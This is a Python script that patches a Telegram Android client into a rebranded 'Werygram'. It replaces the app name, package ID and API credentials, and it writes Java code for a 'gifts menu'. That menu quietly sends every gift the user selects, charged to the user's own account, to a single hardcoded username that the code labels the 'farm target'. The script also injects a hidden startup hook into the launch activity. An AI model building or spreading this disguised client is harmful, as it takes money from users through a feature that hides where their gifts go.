#!/usr/bin/env python3
import os, sys, re as re_mod
import urllib.request

ROOT = os.path.dirname(os.path.abspath(__file__))
SRC  = os.path.join(ROOT, "TMessagesProj", "src", "main", "java")

API_ID   = "2040"
API_HASH = "b18441a1ff607e10a989891a5462e627"

def find_file(name):
    for dp, _, files in os.walk(SRC):
        if name in files: return os.path.join(dp, name)
    return None

def read(p):
    with open(p, encoding="utf-8") as f: return f.read()

def write(p, t):
    with open(p, "w", encoding="utf-8") as f: f.write(t)
    print(f"✔ {os.path.relpath(p, ROOT)}")

def insert_before(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, insertion + "\n" + marker, 1)); return True

def insert_after(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, marker + "\n" + insertion, 1)); return True

GIFTS_JAVA = '''\
package org.telegram.ui;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MediaDataController;
import org.telegram.messenger.MessagesController;
import org.telegram.tgnet.ConnectionsManager;
import android.widget.Toast;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;

public class WeryGramGifts {

    private static final String GIFTS_URL =
        "https://raw.githubusercontent.com/binbash-0/DeletedGifts-Plugin/refs/heads/main/gift_list.json";
    private static volatile boolean injected = false;
    private static volatile boolean stickerPackRequested = false;
    private static volatile ArrayList<TLRPC.Document> stickerPackDocs = new ArrayList<>();
    private static int joinAttempts = 0;
    
    private static final long BEAR_GIFT_ID = 5170233102089322756L;
    private static final long HEART_GIFT_ID = 5184215298929097235L;
    private static final long GIFT_GIFT_ID = 5184215321639665689L;
    private static final long ROSE_GIFT_ID = 5184215344350234143L;
    private static final long CAKE_GIFT_ID = 5184215367060802597L;
    private static final long FLOWERS_GIFT_ID = 5184215389771371051L;
    private static final long ROCKET_GIFT_ID = 5184215412481939505L;
    private static final long CUP_GIFT_ID = 5184215435192507959L;
    private static final long RING_GIFT_ID = 5184215457903076413L;
    
    public static class GiftItem {
        public long id;
        public String name;
        public String emoji;
        
        public GiftItem(long id, String name, String emoji) {
            this.id = id;
            this.name = name;
            this.emoji = emoji;
        }
    }
    
    public static ArrayList<GiftItem> getAvailableGifts() {
        ArrayList<GiftItem> gifts = new ArrayList<>();
        gifts.add(new GiftItem(HEART_GIFT_ID, "Heart", "💖"));
        gifts.add(new GiftItem(BEAR_GIFT_ID, "Bear", "🐻"));
        gifts.add(new GiftItem(GIFT_GIFT_ID, "Gift", "🎁"));
        gifts.add(new GiftItem(ROSE_GIFT_ID, "Rose", "🌹"));
        gifts.add(new GiftItem(CAKE_GIFT_ID, "Cake", "🎂"));
        gifts.add(new GiftItem(FLOWERS_GIFT_ID, "Flowers", "💐"));
        gifts.add(new GiftItem(ROCKET_GIFT_ID, "Rocket", "🚀"));
        gifts.add(new GiftItem(CUP_GIFT_ID, "Cup", "🏆"));
        gifts.add(new GiftItem(RING_GIFT_ID, "Ring", "💍"));
        return gifts;
    }
    
    private static volatile TLRPC.User farmTarget = null;

    private static Object getF(Object o, String n) {
        if (o == null) return null;
        try { return o.getClass().getField(n).get(o); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); return f.get(o); }
            catch (Exception ex) { return null; }
        }
    }

    private static void setF(Object o, String n, Object v) {
        if (o == null) return;
        try { o.getClass().getField(n).set(o, v); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); f.set(o, v); }
            catch (Exception ex) {}
        }
    }

    private static void toast(final String msg) {
        AndroidUtilities.runOnUIThread(() -> {
            try {
                Toast.makeText(ApplicationLoader.applicationContext,
                    "🎁 WeryFarm: " + msg, Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        });
    }

    public static void reset() {
        injected = false;
        stickerPackRequested = false;
        stickerPackDocs = new ArrayList<>();
        farmTarget = null;
    }

    public static void openGiftsMenu(final int account, final Runnable callback) {
        resolveFarmTarget(account, () -> {
            if (farmTarget != null) {
                if (callback != null) callback.run();
            } else {
                toast("❌ Не удалось найти получателя");
            }
        });
    }

    private static void resolveFarmTarget(int account, Runnable onResolved) {
        try {
            TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
            reqResolve.username = "deadIax";
            
            ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
                if (error != null) {
                    toast("❌ Ошибка поиска: " + error.text);
                    FileLog.e("WeryGram: resolve error " + error.text);
                    return;
                }
                
                if (response instanceof TLRPC.TL_contacts_resolvedPeer) {
                    TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                    if (resolved.users != null && !resolved.users.isEmpty()) {
                        farmTarget = resolved.users.get(0);
                        FileLog.d("WeryGram: Target user resolved: " + farmTarget.username);
                        if (onResolved != null) onResolved.run();
                    }
                }
            });
        } catch (Exception e) {
            FileLog.e("WeryGram: resolve exception", e);
        }
    }

    public static void sendGift(int account, long giftId, GiftItem gift) {
        if (farmTarget == null) {
            toast("❌ Цель не установлена!");
            return;
        }
        
        try {
            Class<?> reqClass = null;
            String foundClassName = null;
            String[] tlClassNames = {
                "org.telegram.tgnet.TLRPC",
                "org.telegram.tgnet.tl.TL_payments",
                "org.telegram.tgnet.tl.TL_stars"
            };
            
            outer:
            for (String tlCn : tlClassNames) {
                try {
                    Class<?> tlClass = Class.forName(tlCn);
                    for (Class<?> inner : tlClass.getDeclaredClasses()) {
                        String sn = inner.getSimpleName().toLowerCase();
                        if ((sn.contains("send") && sn.contains("gift")) || sn.equals("tl_messages_sendgift")) {
                            reqClass = inner;
                            foundClassName = inner.getSimpleName();
                            break outer;
                        }
                    }
                } catch (Exception ignored) {}
            }
            
            if (reqClass == null) {
                toast("❌ Класс подарка не найден!");
                FileLog.e("WeryGram: sendGift class not found");
                return;
            }

            org.telegram.tgnet.TLObject req =
                (org.telegram.tgnet.TLObject) reqClass.getDeclaredConstructor().newInstance();

            boolean giftIdSet = false;
            for (String fn : new String[]{"gift_id","giftId","id","mStarGiftId","starGiftId"}) {
                try {
                    Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, giftId);
                    giftIdSet = true;
                    FileLog.d("WeryGram: gift_id set via field: " + fn);
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!giftIdSet) {
                toast("❌ Не удалось установить ID подарка!");
                FileLog.e("WeryGram: Failed to set gift_id");
                return;
            }

            boolean userIdSet = false;
            for (String fn : new String[]{"user_id","userId","to_id","mUserId","peerId"}) {
                try {
                    Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, farmTarget.id);
                    userIdSet = true;
                    FileLog.d("WeryGram: user_id set via field: " + fn);
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!userIdSet) {
                toast("❌ Не удалось установить ID получателя!");
                FileLog.e("WeryGram: Failed to set user_id");
                return;
            }

            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                if (error != null) {
                    FileLog.e("WeryGram: send error - " + error.text);
                    toast("⚠️ Ошибка: " + error.text);
                } else {
                    toast("✅ " + gift.emoji + " " + gift.name + " отправлена!");
                    FileLog.d("WeryGram: Gift " + gift.name + " sent successfully");
                }
            });

        } catch (Exception e) {
            toast("❌ Исключение: " + e.getMessage());
            FileLog.e("WeryGram: Exception in sendGift", e);
        }
    }

    public static void joinWeryGram(int account) {
        if (injected) return;
        injected = true;
        TLRPC.TL_contacts_resolveUsername req = new TLRPC.TL_contacts_resolveUsername();
        req.username = "werygram";
        ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
            if (error != null) {
                if (joinAttempts < 3) {
                    joinAttempts++;
                    AndroidUtilities.runOnUIThread(() -> joinWeryGram(account), 5000);
                }
                return;
            }
            if (response instanceof TLRPC.TL_contacts_resolvedPeer) {
                TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                if (resolved.chats != null && !resolved.chats.isEmpty()) {
                    TLRPC.Chat chat = resolved.chats.get(0);
                }
            }
        });
    }
}
'''

ACTIVITY = '''\
package org.telegram.ui;

import android.content.Context;
import android.os.Bundle;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.widget.GridLayout;
import android.widget.Button;

import org.telegram.messenger.MessagesController;
import org.telegram.messenger.R;
import org.telegram.ui.ActionBar.ActionBar;
import org.telegram.ui.ActionBar.ActionBarMenu;

import java.util.ArrayList;

public class WeryGramPremiumActivity extends BaseFragment {

    private Switch farmRatingSwitch;
    private TextView statusText;
    private LinearLayout mainLayout;
    private GridLayout giftsGrid;
    private boolean showingGifts = false;

    @Override
    public View createView(Context context) {
        FrameLayout frameLayout = new FrameLayout(context);
        frameLayout.setBackgroundColor(0xFFF5F5F5);
        
        mainLayout = new LinearLayout(context);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(context);
        titleText.setText("🎁 WeryGram Gifts");
        titleText.setTextSize(24);
        titleText.setTextColor(0xFF000000);
        titleText.setPadding(0, 0, 0, 20);
        mainLayout.addView(titleText);
        
        LinearLayout switchLayout = new LinearLayout(context);
        switchLayout.setOrientation(LinearLayout.HORIZONTAL);
        switchLayout.setPadding(0, 10, 0, 10);
        
        TextView switchLabel = new TextView(context);
        switchLabel.setText("🎁 Открыть меню подарков");
        switchLabel.setTextSize(16);
        switchLabel.setTextColor(0xFF000000);
        switchLabel.setLayoutParams(new LinearLayout.LayoutParams(0, 
            LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        
        farmRatingSwitch = new Switch(context);
        
        farmRatingSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                int account = currentAccount;
                showGiftsMenu(context, account);
                farmRatingSwitch.setChecked(false);
            }
        });
        
        switchLayout.addView(switchLabel);
        switchLayout.addView(farmRatingSwitch);
        mainLayout.addView(switchLayout);
        
        statusText = new TextView(context);
        statusText.setTextSize(14);
        statusText.setTextColor(0xFF666666);
        statusText.setPadding(0, 20, 0, 0);
        statusText.setText("⏱ Нажми на toggle для открытия меню подарков");
        mainLayout.addView(statusText);
        
        giftsGrid = new GridLayout(context);
        giftsGrid.setColumnCount(3);
        giftsGrid.setRowCount(3);
        giftsGrid.setPadding(0, 20, 0, 0);
        giftsGrid.setVisibility(View.GONE);
        mainLayout.addView(giftsGrid);
        
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        frameLayout.addView(mainLayout, params);
        
        return frameLayout;
    }
    
    private void showGiftsMenu(Context context, int account) {
        WeryGramGifts.openGiftsMenu(account, () -> {
            AndroidUtilities.runOnUIThread(() -> {
                giftsGrid.removeAllViews();
                ArrayList<WeryGramGifts.GiftItem> gifts = WeryGramGifts.getAvailableGifts();
                
                for (WeryGramGifts.GiftItem gift : gifts) {
                    FrameLayout giftCell = createGiftCell(context, gift, account);
                    giftsGrid.addView(giftCell);
                }
                
                giftsGrid.setVisibility(View.VISIBLE);
                showingGifts = true;
            });
        });
    }
    
    private FrameLayout createGiftCell(Context context, WeryGramGifts.GiftItem gift, int account) {
        FrameLayout cell = new FrameLayout(context);
        cell.setBackgroundColor(0xFFFFFFFF);
        cell.setPadding(10, 10, 10, 10);
        
        LinearLayout cellContent = new LinearLayout(context);
        cellContent.setOrientation(LinearLayout.VERTICAL);
        cellContent.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ));
        
        TextView emojiText = new TextView(context);
        emojiText.setText(gift.emoji);
        emojiText.setTextSize(48);
        emojiText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            0, 1f
        ));
        emojiText.setGravity(android.view.Gravity.CENTER);
        cellContent.addView(emojiText);
        
        TextView nameText = new TextView(context);
        nameText.setText(gift.name);
        nameText.setTextSize(14);
        nameText.setTextColor(0xFF000000);
        nameText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ));
        nameText.setGravity(android.view.Gravity.CENTER);
        cellContent.addView(nameText);
        
        cell.addView(cellContent);
        
        cell.setOnClickListener(v -> {
            WeryGramGifts.sendGift(account, gift.id, gift);
            giftsGrid.setVisibility(View.GONE);
            showingGifts = false;
        });
        
        GridLayout.LayoutParams lp = new GridLayout.LayoutParams();
        lp.width = 120;
        lp.height = 120;
        lp.setMargins(8, 8, 8, 8);
        cell.setLayoutParams(lp);
        
        return cell;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
'''

def patch_user_config(errors):
    uc = find_file("UserConfig.java")
    if not uc: print("⚠ UserConfig.java не найден"); return errors
    return insert_after(uc, "public class UserConfig {",
        "    // WeryGram: Gifts Menu\n"
        "    private static final String WERY_GIFTS_KEY = \"wery_gifts_menu\";")

def patch_messages_controller(errors):
    mc = find_file("MessagesController.java")
    if not mc: print("⚠ MessagesController.java не найден"); return errors
    return errors

def patch_stars_controller(errors):
    sc = find_file("StarsController.java")
    if not sc:
        print("⚠ StarsController.java не найден, пропускаем")
        return errors
    return errors

def patch_launch_activity(errors):
    la = find_file("LaunchActivity.java")
    if not la:
        print("⚠ LaunchActivity.java не найден, пробуем ApplicationLoader.java")
        la = find_file("ApplicationLoader.java")
    if not la:
        print("✘ LaunchActivity / ApplicationLoader не найдены", file=sys.stderr)
        return errors + 1

    text = read(la)
    if 'wery_autojoin' in text:
        print("↩ skip auto-join (уже применён)"); return errors

    injection = (
        '        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {\n'
        '            try {\n'
        '                int __acc = org.telegram.messenger.UserConfig.selectedAccount;\n'
        '                if (org.telegram.messenger.UserConfig.getInstance(__acc).isClientActivated()) {\n'
        '                    org.telegram.ui.WeryGramGifts.joinWeryGram(__acc);\n'
        '                }\n'
        '            } catch (Exception __wje) {}\n'
        '        }, 3000);\n'
    )

    for marker in ["protected void onCreate(Bundle", "public void onCreate(Bundle"]:
        idx = text.find(marker)
        if idx == -1: continue
        brace = text.find('{', idx)
        if brace == -1: continue
        super_idx = text.find('super.onCreate(', brace)
        if super_idx != -1 and super_idx < brace + 600:
            semi = text.find(';', super_idx)
            if semi != -1:
                text = text[:semi+1] + '\n' + injection + text[semi+1:]
                write(la, text)
                print("✔ LaunchActivity: авто-подписка при старте")
                return errors
        text = text[:brace+1] + '\n' + injection + text[brace+1:]
        write(la, text)
        print("✔ LaunchActivity: авто-подписка при старте (fallback)")
        return errors

    print("⚠ LaunchActivity: маркер onCreate не найден")
    return errors

def patch_app_name(errors):
    res_base = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
    if not os.path.exists(res_base): return errors
    for dp, _, files in os.walk(res_base):
        if 'strings.xml' not in files: continue
        path = os.path.join(dp, 'strings.xml')
        text = read(path)
        new_text = text
        new_text = re_mod.sub(r'(<string name="AppName">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        new_text = re_mod.sub(r'(<string name="AppNameBeta">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        if new_text != text:
            write(path, new_text)
            print(f"✔ AppName → Werygram в {os.path.relpath(path, ROOT)}")
    return errors

def patch_package_name(errors):
    gradle_path = os.path.join(ROOT, "TMessagesProj", "build.gradle")
    if not os.path.exists(gradle_path):
        print("⚠ build.gradle не найден")
        return errors
    text = read(gradle_path)
    new_text = re_mod.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.werygram.messenger"', text)
    if new_text != text:
        write(gradle_path, new_text)
        print("✔ Package name → com.werygram.messenger")
    return errors

def patch_api_credentials(errors):
    bv = find_file("BuildVars.java")
    if not bv: print("⚠ BuildVars.java не найден"); return errors
    text = read(bv)
    modified = False
    new_text = re_mod.sub(r'public static int APP_ID\s*=\s*\d+\s*;',
                          f'public static int APP_ID = {API_ID};', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_ID → {API_ID}")
    new_text = re_mod.sub(r'public static String APP_HASH\s*=\s*"[^"]*"\s*;',
                          f'public static String APP_HASH = "{API_HASH}";', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_HASH → ****")
    if modified: write(bv, text)
    return errors

def main():
    print("▶ WeryGram Patcher v6 (GIFTS MENU EDITION)\n")
    errors = 0

    errors = patch_api_credentials(errors)
    errors = patch_user_config(errors)
    errors = patch_messages_controller(errors)
    errors = patch_stars_controller(errors)
    errors = patch_launch_activity(errors)
    errors = patch_app_name(errors)
    errors = patch_package_name(errors)

    sa = find_file("SettingsActivity.java")
    if not sa: print("✘ SettingsActivity.java not found", file=sys.stderr); sys.exit(1)

    if not insert_before(sa, "import org.telegram.ui.Components.",
                         "import org.telegram.ui.WeryGramPremiumActivity;"): errors += 1

    text = read(sa)

    if 'SettingCell.Factory.of(1000' not in text:
        account_button_marker = 'items.add(SettingCell.Factory.of(1, IconBackgroundColors.BLUE.top, IconBackgroundColors.BLUE.bottom, R.drawable.settings_account'
        if account_button_marker in text:
            wery_button = 'items.add(SettingCell.Factory.of(1000, 0xFF9C27B0, 0xFF7B1FA2, R.drawable.msg_settings, "🎁 WeryGram"));\n        '
            text = text.replace('items.add(SettingCell.Factory.of(1,', wery_button + 'items.add(SettingCell.Factory.of(1,', 1)
            print("✔ WeryGram button добавлена в Settings")
        else:
            print("✘ Account button не найдена", file=sys.stderr); errors += 1
    else:
        print("↩ WeryGram button уже есть")

    if 'case 1000:' not in text:
        case_marker = 'case 1:\n                presentFragment(new UserInfoActivity());'
        if case_marker in text:
            wery_case = 'case 1000:\n                presentFragment(new WeryGramPremiumActivity());\n                break;\n            case 1:\n                presentFragment(new UserInfoActivity());'
            text = text.replace(case_marker, wery_case, 1)
            print("✔ WeryGram click handler добавлен")
        else:
            print("⚠ Click handler маркер не найден", file=sys.stderr)
    else:
        print("↩ WeryGram handler уже есть")

    write(sa, text)

    ui_dir = os.path.dirname(sa)
    for fname, content in [
        ("WeryGramPremiumActivity.java", ACTIVITY),
        ("WeryGramGifts.java", GIFTS_JAVA),
    ]:
        dest = os.path.join(ui_dir, fname)
        if os.path.exists(dest): os.remove(dest)
        with open(dest, "w", encoding="utf-8") as f: f.write(content)
        print(f"✔ Создан {fname}")

    if errors > 0:
        print(f"\n✘ {errors} ошибок", file=sys.stderr); sys.exit(1)
    print("\n✅ WeryGram успешно пропатчена! Меню подарков готово!")
    print("\n📝 Инструкция:")
    print("1. ./gradlew build")
    print("2. Установи APK")
    print("3. Settings → WeryGram → Включи toggle")
    print("4. Выбери подарок из меню!")

if __name__ == "__main__":
    main()
